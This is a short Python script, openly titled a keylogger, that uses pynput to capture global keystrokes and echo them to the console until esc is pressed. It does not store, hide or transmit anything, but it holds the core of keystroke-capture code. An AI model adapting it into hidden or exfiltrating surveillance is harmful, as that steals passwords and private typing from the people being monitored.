from pynput import keyboard
import sys

def on_press(key):
    try:
        sys.stdout.write(key.char)
        sys.stdout.flush()
    except AttributeError:
        if key == keyboard.Key.enter:
            sys.stdout.write("\n")
        elif key == keyboard.Key.tab:
            sys.stdout.write("\t")
        elif key == keyboard.Key.space:
            sys.stdout.write(" ")
        elif key == keyboard.Key.backspace:
            sys.stdout.write("\b \b ")
        sys.stdout.flush()

def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting Keylogger")
        return False

print("Entering Keylogger")
print("Click esc to exit Keylogger")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()